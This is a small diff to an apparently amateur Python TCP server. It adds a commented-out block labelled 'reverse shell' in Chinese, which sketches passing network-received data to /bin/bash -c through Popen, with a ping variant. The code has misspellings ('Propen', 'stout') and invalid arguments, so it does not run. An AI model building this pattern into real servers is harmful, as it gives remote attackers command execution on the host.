@@ -23,3 +23,16 @@ while True:
         
 tcpClient.close()
 tcpServer.close()
+
+
+'''
+#反弹shell
+from subprocess import PIPE,Popen
+
+cmd = Propen(['/bin/bash','-c',data],stdin=PIPE,stdout=PIPE)
+
+#ping
+
+ping = Propen(['/bin/bash','-c',ping -c,data],stdin=PIPE,stdout=PIPE)
+data = ping.stout.read()
+'''
